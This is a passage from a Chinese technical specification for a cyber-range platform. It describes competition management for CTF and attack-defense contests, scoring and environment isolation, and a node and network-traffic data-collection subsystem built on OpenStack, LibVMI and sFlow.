支持攻防赛环境的快速生成，快速搭建起比赛所需的网络环境，包括路由器、交换机等网络设备。系统按照网络拓扑自动生成比赛环境，确保不同队伍的环境相互隔离，增加比赛的真实性和技术挑战。</p><p>15） 提供比赛的手动提前开始和结束功能，可以让比赛组织者根据实际情况，在预定的开始时间之前启动比赛以及让比赛组织者在原定结束时间之前终止比赛；支持比赛的暂停、恢复以及延期，在比赛进行中，可能会遇到一些意外情况或技术问题，需要暂停比赛以解决。比赛组织者可以通过相应的指令，暂停比赛并通知参赛队伍，等问题解决后，再恢复比赛的进行。而在一些特殊情况下，可能需要延期比赛，比赛组织者可以根据实际情况，决定将比赛延期到合适的时间。以此提高比赛的灵活性和应对突发事件的能力。</p><p>16） 支持比赛公告和私信管理，包括Flag验证、周期性更新、作弊检测、异常检测、积分计算、排行榜导出功能。这些功能确保比赛的透明性和公平性，同时提供有效的赛事沟通和信息管理。</p><p>17） 提供针对攻防赛中赛题服务的检测及其配置和管理功能。系统能根据赛题类型设置所需检测的内容，提供赛题检测服务的日志查看功能，并可启动、停止检测管理服务。根据赛题服务状态自动计算得分，确保比赛的准确性和公正性。</p><p>18） 支持不少于两种选手接入比赛环境的方式，可配置选择，包括通过Web接入或选手自带设备接入，提高比赛的可访问性和适应性。</p><p>19） 支持针对具体比赛的比赛报告自动生成，以及针对具体队伍参与的所有比赛的比赛报告自动生成，为赛事组织者提供详细的比赛分析和回顾。</p><p>20） 支持比赛过程中某个周期的分数重置，这增加了比赛的动态性和不确定性，激励参赛队伍在整个比赛期间保持活跃和竞争性。这些功能的集成为比赛的组织、管理和执行提供了强大的支持，确保了比赛的顺利进行、公平性以及参与者的积极参与。</p><p>21）该测评竞赛模块支持攻防赛Plus的赛题设置不同分数，每个队伍都可以设定相互独立且完全相同的答题环境。这种功能确保了比赛的公平性和公正性，每个队伍都有相同的机会展示自己的实力。</p><p>22）该模块支持比赛采用周期记分的方式，比赛周期时长可自定义。用户可以根据实际需求设置比赛的时长和记分方式，使得比赛更加灵活和多样化。</p><p>23） 该模块提供比赛的手动提前开始、手动提前结束功能，还支持比赛的暂停、恢复以及延期。这些功能为用户提供了更多的控制权，可以根据实际情况调整比赛进程。</p><p>24） 对于每个赛题，该模块支持配置防御检测脚本。选手提交的防御补丁经检测成功通过后，即可获得对应的防御分数。这有助于评估选手的防御能力和技巧。</p><p>25） 该模块针对每个赛题和队伍支持获得攻击分数，一次攻击成功可以在成功周期的下个周期以及后续的周期持续得分。这种得分机制鼓励选手在比赛中持续发挥攻击能力。</p><p>26） 若选手上传防御包导致服务器异常，该模块会扣除一定的异常分数。同时，赛题异常后支持选手重置赛题环境，并可配置重置的次数，超过允许重置的次数后将扣除对应的重置分数。这有助于规范比赛行为并确保比赛的顺利进行。</p><p>27）该模块支持攻防赛Plus的队伍得分统计，包括总分、攻击得分、防守得分、防守失分、异常得分以及异常失分。这种统计功能为用户提供了全面的比赛数据和分析依据。</p><p>28）该模块支持知识赛的组织与管理，能够设置赛题和选手。用户可以根据实际需求设置不同的赛题和选手，以适应不同类型的比赛。</p><p>29）提供题库选择组赛功能，用户可以从题库中挑选相关的赛题，快速组织比赛。</p><p>30）该模块还支持答题倒计时功能，超时后自动切入到下一题。这种功能提高了比赛的效率和紧张感。</p><p>31） 比赛结束后，系统支持查看选手的答题结果。这一功能允许赛事组织者和参赛者回顾比赛表现，为未来的培训和改进提供重要信息。</p><p>32） 系统支持比赛环境的批量生成、部署和测试，以及流量采集和录屏监控等功能。高层环境封装功能可以自动计算和填充所需的比赛环境参数，确保环境的快速部署和正确配置。</p><p>33） 提供夺旗赛、攻防赛和攻防赛Plus模式下赛事相关要素的一键配置功能。在配置过程中，提供进度条提示，实时显示配置的进度，让比赛组织者清楚地了解当前配置的状态。系统能够根据选定的赛题和队伍自动进行环境分配，并自动生成队伍访问赛题的路由，确保队伍间环境的相互隔离和独立性。</p><p>34） 支持夺旗赛、攻防赛和攻防赛Plus模式下的赛前测试功能，可在测试结束后还原比赛数据，提供了一个无风险的环境供参赛队伍练习和准备。</p><p>35） 支持比赛过程中对答题进行监控，并对选手虚拟机进行控制，包括重启和重置等操作。此外，系统还能够对参赛队伍进行禁赛和恢复等管理操作，确保比赛的规则得到执行。</p><p>36） 支持赛后队伍或个人得分的查看，以及比赛报告的生成。这些功能为赛事组织者和参赛者提供了详细的比赛分析和成绩总结，有助于评估表现和提供反馈。</p><h4 id="性能实施方案-15"><a href="#性能实施方案-15" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 系统具备足够的资源容量，系统支持同时容纳不少于50支队伍或200位选手参加比赛，确保大规模赛事的顺利进行。</p><p>2） 提供丰富的竞赛题目资源，系统提供了不少于600个竞赛实操（CTF）题目，内置题目大于400个，确保丰富多样的比赛内容和挑战。</p><h4 id="技术实现内容-15"><a href="#技术实现内容-15" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数为，系统支持夺旗赛的赛事活动组织与管理，包括线上和线下模式，线上模式能生成外网访问的随机地址。实现夺旗赛赛题环境的快速构建与管理，一键生成比赛环境。系统支持比赛一血积分激励机制，第一个回答正确的队伍获得额外积分，可灵活设置激励队伍的比例及分数。提供比赛自动开始与停止管理，禁止选手比赛前后进入环境或答题。支持比赛的手动提前开始、结束，暂停、恢复及延期。</p><p>系统实现分阶段开放赛题、定时开放赛题及赛题开放通知。支持非固定Flag赛题的作弊检测，违规队伍可自动或手动禁赛、恢复比赛。队伍可申请解题提示，提示后正确答题可扣分，支持提示的定时发放。实现两种盲打方式：选手不可查看排行榜和提交Flag后不知答题正确与否。支持比赛一血赛题的消息公告，配置针对赛题或比赛的提交报告。</p><p>攻防赛赛事活动定义，支持比赛队伍和选手管理，选手加入不同队伍参与比赛。快速生成攻防赛环境，包括路由器、交换机等，按网络拓扑自动生成，队伍环境相互隔离。提供比赛公告和私信管理，具备Flag验证、周期性更新、作弊检测、异常检测、积分计算、排行导出等功能。</p><p>针对攻防赛中赛题服务的检测及配置、管理功能，根据赛题类型设置检测内容，提供日志查看，启动、停止检测管理服务，根据服务状态自动算分。两种选手接入方式：Web接入或自带设备接入。支持比赛报告自动生成，包括具体比赛和队伍参与所有比赛的报告。比赛过程中支持周期分数重置，攻防赛Plus赛题设定不同分数，周期记分方式，比赛周期时长可自定义。</p><p>每个赛题配置防御检测脚本，选手提交防御补丁经检测成功后，获得队伍防御分数。攻击分数基于一次成功攻击，持续得分。选手上传防御包导致服务器异常时扣异常分数，支持赛题环境重置，配置重置次数超限扣重置分数。攻防赛Plus队伍得分统计包括总分、攻击得分、防守得分、防守失分、异常得分和失分。</p><p>知识赛组织与管理，设置赛题和选手，从题库挑选赛题，支持答题倒计时，比赛结束后查看答题结果。比赛环境的批量生成、部署、测试、流量采集、录屏监控等，环境需求的高层封装，自动计算填充部署参数。支持夺旗赛、攻防赛和攻防赛Plus模式下赛事相关要素的一键配置，展示配置进度和结果。根据赛题、队伍自动分配环境，生成队伍访问赛题的路由。支持赛前测试，重新开始还原比赛数据；比赛过程中监控答题过程，控制选手虚拟机，包括重启、重置等，进行禁赛、恢复管理；赛后提供队伍或个人得分查看，生成比赛报告。</p><p>性能参数为，系统支持50支队伍或200位选手同时参加比赛。竞赛实操（CTF）题目共600个，其中内置400个。</p><h5 id="方案设计-4"><a href="#方案设计-4" class="headerlink" title="方案设计"></a>方案设计</h5><p>1. 赛事活动组织与管理</p><p>支持线上夺旗赛模式，为外网访问生成随机地址；线下模式支持传统的物理场地设置。</p><p>支持夺旗赛、攻防赛和攻防赛Plus模式下赛事相关要素的一键配置，展示配置进度及结果。</p><p>支持比赛环境的批量生成、部署、测试、流量采集、录屏监控等功能。</p><p>支持环境需求的高层封装，自动计算填充比赛环境部署所需参数。</p><p>2. 赛题环境与赛事管理</p><p>支持赛题环境的快速构建与管理，一键生成比赛环境，自动分配队伍访问赛题路由，确保队伍间环境互不影响。</p><p>支持比赛自动开始与停止，禁止选手提前进入环境，比赛结束后禁止答题。</p><p>支持分阶段开放赛题、定时开放赛题，并发送赛题开放通知。</p><p>支持非固定Flag赛题的作弊检测，自动禁赛、手动禁赛以及恢复比赛的管理。</p><p>3. 积分与激励机制</p><p>支持一血积分激励机制，第一个回答正确的队伍可获得额外积分，激励队伍的百分比及分数可灵活设置。</p><p>支持攻防赛Plus中不同赛题设置不同分数，每个队伍设定相互独立且完全相同的答题环境。</p><p>支持比赛采用周期记分的方式，比赛周期时长可自定义，支持周期分数的重置。</p><p>4. 盲打与公告管理</p><p>支持至少两种盲打方式，选手不能查看排行榜或提交Flag后不知道答题是否正确。</p><p>支持比赛一血赛题的消息公告，配置针对赛题提交报告或针对比赛提交报告。</p><p>5. 攻防赛环境与队伍管理</p><p>支持攻防赛环境的快速生成，包括路由器、交换机等网络设备，按网络拓扑自动生成比赛环境，不同队伍环境相互隔离。</p><p>支持比赛队伍和选手管理，选手可加入不同的队伍进行不同场次的比赛。</p><p>支持攻防赛中赛题服务的检测及其配置与管理，赛题检测服务的日志查看功能，可启动、停止检测管理服务。</p><p>6. 接入与报告</p><p>支持两种选手接入比赛环境的方式：通过Web接入或选手自带设备接入。</p><p>支持针对具体比赛的比赛报告的自动生成；支持针对具体队伍参与的所有比赛的比赛报告的自动生成。</p><p>7. 防御与攻击得分</p><p>支持每个赛题配置防御检测脚本，选手提交赛题的防御补丁经检测成功通过后，获得队伍的防御分数。</p><p>支持每个赛题每个队伍获得攻击分数，一次攻击成功后在下个周期及后续周期持续得分。</p><p>8. 环境与监控管理</p><p>支持比赛过程中答题过程监控，对选手虚拟机进行控制，包括重启、重置等，对参赛队伍进行禁赛、恢复等管理。</p><p>支持赛前测试功能，重新开始会还原比赛数据。</p><p>9. 赛后管理</p><p>支持赛后队伍或个人的得分查看，生成比赛报告。</p><p>10. 竞赛实操题目</p><p>提供600个CTF题目，其中400个内置。</p><p>性能参数</p><p>支持50支队伍或200位选手同时参加比赛。</p><p>本方案提供了竞赛管理系统的详细架构，包括赛事的组织、赛题环境的管理、积分与激励机制、盲打与公告管理、攻防赛环境与队伍管理、接入与报告生成、防御与攻击得分机制、环境与监控管理、赛后管理，以及题目库的构建。性能参数保证了系统能够在高并发条件下稳定运行，满足大型赛事的需求。</p><h5 id="方案简介-2"><a href="#方案简介-2" class="headerlink" title="方案简介"></a>方案简介</h5><p>系统提供了全方位的知识竞赛组织和管理功能。用户可以自定义赛题和参赛人员，便捷地从题库选题来迅速组织比赛。比赛过程中，系统具备答题时间的倒计时功能，超时自动跳转至下一题。同时，支持以可视化的方式实时展示答题动态和排名情况。竞赛结束后，参赛者的答题详情能够被检索和审查。对于夺旗赛，系统同样提供了灵活的在线和现场赛事组织及管理功能，线上赛事可以通过网络访问系统生成的随机赛题环境路径。还支持一键式快速构建和管理夺旗赛的赛题环境，根据选择的队伍和赛题直接生成比赛环境，优化赛事的流畅性和参与者的体验。</p><p>支持比赛一血积分激励机制，可设置激励百分比及分数；支持比赛自动开始与停止管理功能，在竞技开始前禁止用户进入比赛详情，在竞技停止后禁止用户答题操作；支持分阶段生成比赛环境，支持分阶段放出赛题，支持放出题目时下发通知进行提示；支持对违规作弊的队伍进行禁赛与恢复管理；支持用户主动申请题目提示，对主动申请提示的队伍答对后进行相应的扣分处理；支持比赛过程中，下发题目提示，下发提示时进行消息通知；支持比赛开始后，用户登录到答题系统进行答题，比赛一血赛题的消息通知弹窗，支持赛后提交答题报告；支持夺旗比赛过程中的大屏可视化展示，可视化提供图表展示、包括比赛答题动态、比赛排名等；支持攻防赛事活动的定义，系统中包含了比赛队伍和人员管理功能，允许单个参赛者在不同的队伍里参与多场比赛。平台能够管理比赛公告和私信，同时配备了Flag验证和周期性更新机制，以及作弊和异常行为的检测功能。系统自动进行积分计算，并支持排行榜的导出，确保比赛的公正性和透明度；</p><p>支持竞赛可视化的快速定制。根据竞赛的类型，竞赛的规模大小，竞赛实时攻击的表现方式以及竞赛宣传的不同主题，采用可视化3D技术快速定制适合本次比赛的可视化界面。可视化提供的展示信息包含参赛团队的排行信息、参赛团队的实时攻击信息以及参赛团队的得分失分信息、攻击态势等。支持攻防赛中比赛流量的采集，能够按配置规则分析流量数据，评估并展示比赛态势；其中攻击态势以不同颜色弧线的方式展示各个队伍的攻防情况，队伍所在圆环的密度可以有效反应出当前攻击的激烈程度；系统能够自动创建特定比赛的报告，并同样支持自动生成特定队伍参与的所有比赛的综合报告。这些功能简化了赛后分析，为组织者和参赛者提供详尽的数据回顾。</p><p>系统支持夺旗赛赛事要素的一键配置，方便用户快速下发任务，并实时展示任务进度和结果。系统可以自动为选定的赛题和队伍分配环境，并生成独立的访问路由，以确保各队伍之间的环境不发生干扰。</p><p>比赛环境能够批量生成和部署，并支持测试、流量采集以及录屏监控的功能。高级的封装技术允许系统自动计算并填充部署所需的参数。</p><p>攻防赛环境的快速生成功能涵盖路由器、交换机、防火墙等网络设备，且能按照设定的网络拓扑自动生成环境，确保不同团队间的隔离。</p><p>比赛中，系统能检测和管理靶标服务，并根据靶标的类型自定义检测内容，同时提供日志查看和检测服务的管理功能。靶标服务状态还能自动进行计分或扣分。</p><p>系统支持竞赛人员以WEB接入或虚实互联的方式参与比赛。同时，提供对参赛队伍虚拟机的控制，包括启动、停止和重置操作，还支持对违规队伍的禁赛和恢复参赛的管理操作。如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/68410411b8706427c8666be6307d329d.png"></p><p>测评竞赛</p><h1 id="智能汽车网络靶场数据采集分系统"><a href="#智能汽车网络靶场数据采集分系统" class="headerlink" title="智能汽车网络靶场数据采集分系统"></a>智能汽车网络靶场数据采集分系统</h1><h2 id="技术路线-2"><a href="#技术路线-2" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="节点状态采集模块"><a href="#节点状态采集模块" class="headerlink" title="节点状态采集模块"></a>节点状态采集模块</h3><h4 id="功能实施方案-16"><a href="#功能实施方案-16" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 采集模块能够在目标网络环境内采集不少于6类节点状态信息，其中包括虚拟节点的CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、以及网卡出/入丢包率等重要信息。这些信息的采集有助于全面了解网络节点的性能和健康状况，为监控和维护提供了关键数据支持。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/97c0eb00ef21da6ebdebf25d1c3d9586.png"></p><p>数据采集分系统支持目标网络环境内虚拟节点的多种状态信息采集，包括CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、网卡出/入丢包率等。这些信息对于了解网络负载状况、性能瓶颈和故障排查至关重要。系统通过实时采集这些数据，帮助用户全面掌握节点的工作状态，为后续的数据分析和处理提供基础数据</p><p>2） 采集模块支持对平台本身设备的运行状态进行采集，包括CPU利用率、内存利用率、磁盘利用率等关键性能参数的收集。这些数据的采集允许进行设备性能监控和维护，确保平台设备的正常运行和性能优化。通过采集这些数据，用户可以了解平台自身的资源使用情况，确保平台的稳定运行，并及时发现潜在的性能瓶颈或故障，为设备的维护和故障排查提供依据。</p><p>3） 采集模块支持通过脚本检测目标网络内服务的运行状态，并将结果进行反馈。这种功能为用户提供了更灵活和定制化的服务状态检测方式。用户可以根据实际需求编写脚本，对特定服务进行运行状态检测，并获取相应的反馈结果。这有助于用户及时发现服务的异常情况，并进行相应的处理和解决，确保服务的正常运行和网络的稳定性</p><h4 id="性能实施方案-16"><a href="#性能实施方案-16" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 采集模块能够支持高达不少于1400个虚拟节点状态信息的采集，以应对大规模节点采集的需求，并确保数据的准确性和时效性。</p><h4 id="产品功能截图"><a href="#产品功能截图" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ol><li>支持目标网络环境内虚拟节点CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、网卡出/入丢包率等不少于6类节点状态信息进行采集，提供产品功能截图；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/97c0eb00ef21da6ebdebf25d1c3d9586.png"></p><p>状态管理模块可通过灵活访问方式，对大规模网络仿真场景中的网络仿真节点进行监控。可及时发现网络仿真节点的部署状态、运行状态。提供快照功能，方便网络仿真节点从崩溃状态还原备份。保障了平台平稳运行，是实现大规模网络仿真的必要一步。</p><h4 id="技术实现内容-16"><a href="#技术实现内容-16" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计为，系统支持在目标网络环境内对虚拟节点的多项状态信息进行采集，包括CPU利用率、内存利用率、磁盘利用率、磁盘IO读/写吞吐量、网卡出/入流量大小、网卡出/入丢包率等六类节点状态。此外，系统还支持采集平台本身设备的运行状态，如CPU利用率、内存利用率、磁盘利用率等。系统能够通过脚本检测目标网络内服务的运行状态，并将结果进行有效反馈。</p><p>性能参数设计为，系统支持最多1400个虚拟节点状态信息的采集，确保能够高效处理大规模网络环境中的状态监控需求。这种设计能够为网络运维和安全监控提供全面的数据支撑，提高网络管理的效率和可靠性。</p><p>状态管理模块现已实现以下功能：</p><p>系统的网络部署状态监控功能是针对复杂网络环境中各种资源的部署和管理的重要工具。这些功能允许管理员实时监控和管理网络部署的各个方面，包括：</p><p>1. 虚拟网络部署状态：监控整个虚拟网络的部署过程，包括子网的创建、VLAN配置、路由规则的应用等方面。</p><p>2. 虚拟节点部署状态：检测各个虚拟机或虚拟节点的部署情况，例如操作系统的加载、服务的启动、配置的应用等。</p><p>3. 网络节点和安防设备的部署状态：追踪网络中实体节点如交换机、路由器的部署状态，以及各类安防设备（如防火墙、入侵检测系统）的设置和运行状态。</p><p>为了使部署进程清晰可见，系统支持通过图形化界面展示部署进度。这通常涉及到进度条或图表，展示各个阶段的完成度，问题报告，以及任何需即时解决的关键事项。</p><p>界面显示可能会提供详细视图，如部署日志、资源利用率图、网络拓扑图等，便于管理员及时了解环境状态，并在必要时进行干预。管理员可以利用这些工具进行故障排除、性能优化和资源分配。</p><p>通过这种监控功能，系统确保网络环境的部署按照预定计划顺利进行，同时也提高了问题发现和解决的效率，保障网络环境的稳定性和可靠性。</p><p>对虚拟节点的运行状态进行实时监控，包括CPU利用率、内存利用率、磁盘IO和网卡流量等重要信息。通过监控工具，用户可以实时了解虚拟节点的性能指标和资源利用情况；支持虚拟机节点自动发现崩溃、无响应等状态，如下图所示；</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b59c47cb99ae2d8224b3df71d42d1248.png"></p><p>虚拟节点监控</p><p>实现虚拟机从崩溃中自动恢复到初始状态或手动选择崩溃节点的处理方式，处理方式包括查看虚拟节点状态、重启、重置等操作；实现虚拟节点状态保存和恢复，并提供配置接口；每个虚拟机至少支持保存2个状态</p><p>支持通过Web桌面、远程桌面、Web SSH的方式接入网络节点，接入的方式支持VNC、RDP和SSH；支持对操作进行录屏；支持WINDOWS客户操作系统下USB存储的远程重定向，用户可在操作终端直接通过U盘存取虚拟主机中的信息；</p><p>支持利用虚拟机自省技术对虚拟机进行高速、无感的周期性和单次内部数据监控。支持多个虚拟机的并发的内部数据监控。支持Qemu2.9以上版本，监控过程中不能暂停虚拟机，虚拟机内部不能部署任何代码，不更改任何代码。周期性任务最小间隔时间少于5秒。Linux系统和Windows系统支持获取虚拟机的进程列表、进程命令行参数、进程运行目录、进程运行的环境变量、进程打开的句柄等。Linux系统还支持查看正在监听的端口，查看网卡信息，查看命令行日志，查看登录终端等。</p><p>带外采集系统支持windows系统和linux系统，使用了目前通用的Volatility和LibVMI。支持对多种命令的采集、并发采集。</p><p>性能参数如下：</p><p>支持等于1400个虚拟节点状态信息采集。</p><p>为了有效地监控目标网络部署状态，系统需具备以下几个关键功能：</p><p>1. 虚拟网络部署状态监控：</p><p>功能参数如下：能够实时跟踪和显示虚拟网络的创建和配置过程，包括子网设置、IP地址分配、网络连通性测试等。</p><p>功能参数如下：提供虚拟网络的拓扑视图，方便用户直观理解网络结构。</p><p>功能参数如下：报告网络部署过程中的任何异常，如配置失败、性能瓶颈等。</p><p>2. 虚拟节点部署状态监控：</p><p>功能参数如下：显示每个虚拟机或其他类型虚拟节点（如容器）的部署进度，包括操作系统启动、服务配置等。</p><p>功能参数如下：反馈虚拟节点磁盘、CPU和内存的利用情况，确保它们符合预设的资源分配策略。</p><p>功能参数如下：对于还未完成部署的节点，系统能够提供预计剩余时间和潜在问题的预警。</p><p>3. 网络节点和安防设备部署状态监控：</p><p>功能参数如下：对物理网络设备（如交换机、路由器）和安全设备（如防火墙、入侵检测/防御系统ID/IPS）的部署状态进行监控。</p><p>功能参数如下：实时检测硬件状态和配置的更改，确保所有设备均按预定方案运行。</p><p>功能参数如下：根据安全配置和策略实施情况，确保网络的安全性得到强化。</p><p>系统中的监控功能通常由以下几个部分组成：</p><p>- 实时数据仪表盘：提供关于当前部署状态的概览，包括哪些节点已上线，哪些正在进程中，以及遇到问题需注意的部分。</p><p>- 进度跟踪和历史记录：记录每次部署的详细历史，供进行问题追踪和性能分析。</p><p>- 警报和通知系统：在发生配置错误或设备故障时，系统会发送警报给管理员，以便及时干预。</p><p>通过综合这些工具和功能的系统，管理员能够确保部署过程符合技术和业务要求，同时及时发现并解决可能出现的问题。</p><p>neutron管理虚拟网络的配置情况，并将状态写入network db中,虚拟网络部署状态是horizon通过获取network db中信息进行实时更新。nova管理虚拟节点的配置情况，并将状态写入compute db中, 虚拟节点部署状态是horizon通过获取compute db中信息进行实时更新。网络节点和安防设备的部署状态通过horizon到对应的数据库中获取信息来实时更新状态。</p><p>实现对虚拟节点状态进行实时监控，网络流量监控默认是通过compute 的libvirt进行监控，记录网卡进入与出去流量统计，针对某个虚拟机的网卡，该方式记录所有网卡通过的流量统计。</p><p>网络bandwidth的采集是通过neutron-metering-agent 代理方式进行流量采集，然后push到oslo-messaging, ceilometer-agent-notification 通过监听消息队列来收取bandwidth信息。</p><p>同一子网下虚拟机互相访问不会统计，但不同子网间进过虚拟路由器的流量会被统计，虚拟机与外部网络互访也会统计（有floatingip），实现虚拟机从崩溃中自动恢复到初始状态或手动选择崩溃节点的处理方式。</p><p>用sersync直接同步整个chroot环境，当成功创建一台虚拟机时，把存储上的对应业务文件传送到新实例上即可运行，不过就如上面所说，由于同步的是整个chroot环境，chroot环境本身也可能会很大，其中相当大一部分数据可能并不需要同步，项目经常会产生大量的日志文件，动辄上百G的日志文件，是没有必要同步的。不过确实方便配置管理。</p><p>重新启动的方式包括软重启和硬重启：使用nova api方式，软重启：nova reboot SERVER，硬重启方式：nova reboot –hard SERVER。</p><p>实现虚拟节点状态保存和恢复，并提供配置接口：虚拟节点的保存和恢复都是通过基础镜像以及镜像的增量来实现的。例如在实例文件instance-0000001a中有console.log disk disk.local libvirt.xml等三个文件，console.log 保存虚拟机启动的日志信息，disk 和 disk.local为虚拟机实例的镜像增量文件，libvirt.xml为配置文件。通过horizon可以提供修改这些配置文件的途径，通过修改配置文件，生成多个状态，以支持保存多个虚拟机状态。</p><p>实现对目标网络配置数据、虚拟机状态数据进行回放的接口：目标网络配置数据是horizon通过获取network db数据进行回放，虚拟机状态数据是horizon通过获取compute db数据进行回放，支持通过Web桌面、远程桌面、Web SSH的方式接入网络节点，通过虚拟机提供的vncserver 服务，每次点击远程桌面的时候，页面会传一个vm的标识到action中，action判断这个vm是否属于登录的这个用户，然后在数据库中取出这台vm的vnc服务的ip+port，写成一个配置文件target-config指定目录下，最后把websockets代理机器的ip+port以及vm vnc的password通过action传到vnc_auto.html中，远程桌面采用的是一种类似TELNET的技术，他是从TELNET协议发展而来的。通俗的讲他就是图形化的TELNET.</p><p>Web SSH的方式是利用web模拟ssh方式连接终端机：支持利用虚拟机自省技术对虚拟机进行高速、无感的周期性和单次内部数据监控，虚拟机自省技术对正在运行中的底层虚拟机的运行细节进行监视的功能，监视的功能是由观察内存细节，陷入硬件事件和读取CPU寄存器来完成的，下图表示这一过程。</p><p>LibVMI是一个标准C语言库，而且在vmi初始化的过程中就读取了guest的System.map，因此在这个文件中对符号名进行匹配就可以获取到符号的虚拟地址了，下面是这个过程的代码，可以看到，代码先是在sym–&gt;虚拟地址的缓存中进行查找，当没有找到后才去system.map中读取，并且将读取到的结果缓存到符号cache中。这样就获取到了一个符号的虚拟地址，接下来还要进行读取这个虚拟地址内容的过程。</p><h3 id="网络链路采集模块"><a href="#网络链路采集模块" class="headerlink" title="网络链路采集模块"></a>网络链路采集模块</h3><h4 id="功能实施方案-17"><a href="#功能实施方案-17" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 该网络链路采集模块支持基于sFlow协议对虚拟网络的流量进行采集，并将采集的数据发送至Kafka供其他分系统使用。sFlow是一种开放的流量采样标准协议，用于大规模IP网络流量监控。通过与Kafka集成，该模块能够实现实时数据传输和处理，提高了流量数据的使用效率和价值。</p><p>2） 该模块具备对指定节点的流量采集能力。灵活的配置选项，该模块允许用户通过试验过程导调配置选择需要采集流量的特定节点和端口。这种灵活性使得用户能够根据实际需求精确地定位和采集关键节点的流量数据。流量存储与分析，采集后的流量数据将通过交换机汇聚，并存储在预先配置的流量存储和分析设备中。采用的流量汇聚交换机是业界知名品牌如华为、华三等的通用三层交换机，确保了数据传输的稳定性和高效性。此外，无需SDN功能，整个数据流更为直接和简单，提高了数据处理的效率。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2779aabd054a682ae01f671c2a44033f.png" alt="IMG_256"></p><p>指定节点采集</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7343a511591cd95af4c5be5d939a7ab4.jpeg" alt="nginx配置流量镜像以及验证方式_网站&amp;服务器&amp;网络安全_产品知识库_动易技术中心"></p><p>流量存储采集</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/67f06430c68196f00ac7b0c093d4d92e.png"></p><p>无需SDN的端口镜像汇聚</p><ol><li>该模块支持通过流量镜像的方式从虚拟机某个端口将流量镜像到指定设备的端口，以确保流量的可视化和监测。流量镜像技术是网络监控和分析中常用的一种方法，该模块提供这一功能使得用户可以方便地对虚拟机端口进行流量监控和可视化，有助于及时发现和解决网络问题，提高网络的稳定性和可靠性。</li></ol><h4 id="性能实施方案-17"><a href="#性能实施方案-17" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 流量采集速率将不低于10Gbps，以满足高速网络环境下的流量监控需求。该网络链路采集模块具备高达10Gbps的流量采集速率。能有效地处理大规模的网络流量数据，确保数据的实时性和完整性。</p><p>2） 模块能够支持同时采集不少于200条链路的能力，以确保大规模网络环境下的流量采集和处理的效率和可靠性。此模块支持同时对不少于200条链路进行流量采集。同时采集能力确保了数据的完整性和对比性，为后续的数据分析提供了坚实的基础。</p><h4 id="产品功能截图-1"><a href="#产品功能截图-1" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ol><li>具备对指定节点的流量进行采集能力，能够通过试验过程导调配置需要采集的节点及端口；采集后的流量支持通过交换机汇聚到流量存储和分析设备进行统一存储和分析，流量汇聚交换机需采用华为、华三等品牌的通用三层交换机，无需SDN等功能，提供产品功能截图；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2779aabd054a682ae01f671c2a44033f.png" alt="IMG_256"></p><p>指定节点采集</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7343a511591cd95af4c5be5d939a7ab4.jpeg" alt="nginx配置流量镜像以及验证方式_网站&amp;服务器&amp;网络安全_产品知识库_动易技术中心"></p><p>流量存储采集</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/67f06430c68196f00ac7b0c093d4d92e.png"></p><p>无需SDN的端口镜像汇聚</p><h4 id="技术实现内容-17"><a href="#技术实现内容-17" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计为，系统支持利用sFlow协议对虚拟网络流量进行采集，并能将采集的数据发送至Kafka，供其他分系统使用。系统具备对指定节点流量的采集能力，可通过试验过程导调配置需要采集的节点及端口。采集后的流量能通过通用三层交换机（如华为、华三品牌）汇聚到流量存储和分析设备进行统一存储和分析。此外，系统还支持通过流量镜像的方式，将虚拟机某端口的流量镜像到指定设备端口。</p><p>性能参数设计为，系统的流量采集速率达到10Gbps，能够支持200条链路的同时采集。这种设计确保了在大规模网络环境下高效、稳定的流量监控和分析能力，满足复杂网络环境中对流量管理和安全监控的高要求。</p><h5 id="方案设计-5"><a href="#方案设计-5" class="headerlink" 